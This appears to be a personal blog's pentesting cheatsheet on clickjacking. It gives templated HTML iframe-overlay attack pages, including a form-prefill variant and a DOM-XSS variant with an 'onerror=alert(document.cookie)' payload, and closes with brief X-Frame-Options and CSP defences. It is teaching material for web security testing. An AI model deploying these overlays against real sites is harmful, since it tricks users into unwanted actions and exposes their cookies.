---
title: "Clickjacking    "
subtitle: ""
date: 2020-03-04T15:58:26+08:00
lastmod: 2020-03-04T15:58:26+08:00
draft: false
author: "Hato0"
description: "Clickjacking cheatsheet"

tags: ["web", "penetest", "clickjacking", "phishing"]
categories: ["Penetest - Web"]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: false
ruby: false
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false
toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
share:
  enable: true
comment:
  enable: true
---
# Clickjacking

Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. 

Example (from imperva.com) : 
1.  The attacker creates an attractive page which promises to give the user a free trip to Tahiti.
2.  In the background the attacker checks if the user is logged into his banking site and if so, loads the screen that enables transfer of funds, using query parameters to insert the attacker’s bank details into the form.
3.  The bank transfer page is displayed in an invisible iframe above the free gift page, with the “Confirm Transfer” button exactly aligned over the “Receive Gift” button visible to the user.
4.  The user visits the page and clicks the “Book My Free Trip” button.
5.  In reality the user is clicking on the invisible iframe, and has clicked the “Confirm Transfer” button. Funds are transferred to the attacker.
6.  The user is redirected to a page with information about the free gift (not knowing what happened in the background).

![alt CJ example](https://lh3.googleusercontent.com/QsCvEJWxO4xG9x4pV8Cujs55AqqtPjADgSjlmu9WxI7C0brjrFXc_tlKft169KicxtePmgKnXa-ovKP3SwCNQrXzr4mwSaLEL_EI0I4dF85zPGV7cM3kVCqPcd-VIhyJ-whhkI0)

## Some examples

- Basic clickjacking with CSRF token protection

	1. Construct a page looking like : 
    {{< highlight html "lineNos=false" >}}
    <style>  
        iframe {  
        position:relative;  
        width:$width\_value;  
        height: $height\_value;  
        opacity: $opacity;  // Set opacity to make the button transparent
        z-index: 2;  
        }  
        div {  
        position:absolute;  
        top:$top\_value;  // Change this to fully cover the baiting action
        left:$side\_value;  // Change this to fully cover the baiting action
        z-index: 1;  
        }  
    </style>  
    <div>Test me</div>  
    <iframe src="$url"></iframe>
    {{< /highlight >}}
	
	2. Send the link to the victime and pray


- Clickjacking with form input data prefilled from a URL parameter

	1. Construct a page looking like : 
		{{< highlight html "lineNos=false" >}}
		<style>  
		   iframe {  
			   position:relative;  
			   width:$width_value;  
			   height: $height_value;  
			   opacity: $opacity;  
			   z-index: 2;  
		   }  
		   div {  
			   position:absolute;  
			   top:$top_value;  
			   left:$side_value;  
			   z-index: 1;  
		   }  
		</style>  
		<div>Test me</div>  
		<iframe src="$url?email=hacker@attacker-website.com"></iframe>
		{{< /highlight >}}

	2. Send the link to the victime and pray


- Exploiting clickjacking vulnerability to trigger DOM-based XSS

	1. Construct a page looking like:
	
	{{< highlight html "lineNos=false" >}}
	<style>  
	 iframe {  
	 position:relative;  
	 width:$width\_value;  
	 height: $height\_value;  
	 opacity: $opacity;  
	 z-index: 2;  
	 }  
	 div {  
	 position:absolute;  
	 top:$top\_value;  
	 left:$side\_value;  
	 z-index: 1;  
	 }  
	</style>  
	<div>Test me</div>  
	<iframe  
	src="$url?name=<img src=1 onerror=alert(document.cookie)>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
	{{< /highlight >}}
	
	2. Send the link to the victime and pray
	
- Multistep clickjacking
    
    Just include as much button as you need
{{< highlight html "lineNos=false" >}}
<style>  
    iframe {  
    position:relative;  
    width:$width\_value;  
    height: $height\_value;  
    opacity: $opacity;  
    z-index: 2;  
    }  
    .firstClick, .secondClick {  
    position:absolute;  
    top:$top\_value1;  
    left:$side\_value1;  
    z-index: 1;  
    }  
    .secondClick {  
    top:$top\_value2;  
    left:$side\_value2;  
    }  
</style>  
<div class="firstClick">Test me first</div>  
<div class="secondClick">Test me next</div>  
<iframe src="$url"></iframe>
{{< /highlight >}}



## How to prevent them 

Two main option are in use to prevend them: 

- X-frame-options: 
    - deny : Make the site impossible to include into ifram balise
    - sameorigin: Make ifram only useable on the same website
    - allow-from: Specify URL that can include the website iframe 
- CSP: You can use a lot of CSP option to restrict page inclusion